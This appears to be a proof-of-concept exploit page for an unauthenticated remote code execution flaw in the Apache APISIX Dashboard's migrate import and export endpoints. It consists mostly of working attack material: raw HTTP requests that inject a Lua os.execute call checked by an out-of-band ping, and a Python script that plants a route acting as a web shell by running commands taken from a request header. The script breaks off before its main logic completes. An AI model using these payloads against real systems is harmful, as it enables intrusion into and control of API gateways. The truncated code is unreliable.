# apisix_dashboard_rce
PoC:
The code:
/apisix/admin/migrate/export

/apisix/admin/migrate/import
​
RCE:
Since APISIX is not authorized to modify the configuration file, we note the filter_func parameter:
This function takes by default an input parameter named vars that can be used to retrieve Nginx variables.
We only need to write os.execute () in the execution function in RCE.
The code:Copy to clipboard
POST /apisix/admin/migrate/import HTTP/1.1
Host: xxxxxxx
Accept-Encoding: gzip
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------24464570528145
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Length: 632


-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="file"
Content-Type: image/jpeg


{"Consumers":[],"Routes":[{"id":"999", "create_time":1636350000, "update_time": 1636350000, "uri":"/api/mytest", "name":"test", "filter_func":"function(vars) os.execute(\"ping -c 1 xxxxxxxx\"); return true end","service_id":"999", "status":1}],"Services":[],"SSLs":[],"Upstreams":[],"Scripts":[],"GlobalPlugins":[],"PluginConfigs":[]}²Óf
-----------------------------24464570528145
Content-Disposition: form-data; name="mode"


overwrite
-----------------------------24464570528145--

We check the success of using:
The code:Copy to clipboard
GET /apisix/admin/migrate/export HTTP/1.1
Host: xxxxxxxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Connection: close

The code
curl http://x.x.x.x/api/mytest -vv

We can get RCE data via Dnslog.

Exploit:
Python:Copy to clipboard
#!/usr/bin/env python3
import zlib
import json
import random
import requests
import string
import sys


eval_config = {
    "Counsumers": [],
    "Routes": [
        {
            "id": str(random.randint(100000000000000000, 1000000000000000000)),
            "create_time": 1640674554,
            "update_time": 1640677637,
            "uris": [
                "/rce"
            ],
            "name": "rce",
            "methods": [
                "GET",
                "POST",
                "PUT",
                "DELETE",
                "PATCH",
                "HEAD",
                "OPTIONS",
                "CONNECT",
                "TRACE"
            ],
            "script": "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)",
            "status": 1
        }
    ],
    "Services": [],
    "SSLs": [],
    "Upstreams": [],
    "Scripts": [],
    "GlobalPlugins": [],
    "PluginConfigs": []
}


def random_str():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))


def calc_crc(data):
    crc32 = zlib.crc32(data) & 0xffffffff
    return crc32.to_bytes(4, byteorder="big")


def export_data(url):
    r = requests.get(url + "/apisix/admin/migrate/export")
    return r.text[:-4]


def import_data(url, data):
    data = json.dumps(data).encode()
    crc32 = calc_crc(data)

    files = {"file": ("data", data + crc32, "text/data")}
    resp = requests.post(url + "/apisix/admin/migrate/import", files=files)
    # print(resp.text)
    if resp.json().get("code", -1) == 0:
        return True
    else:
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("python " + sys.argv[0] + " http://127.0.0.1:9000")
        exit()
![](readme.png)


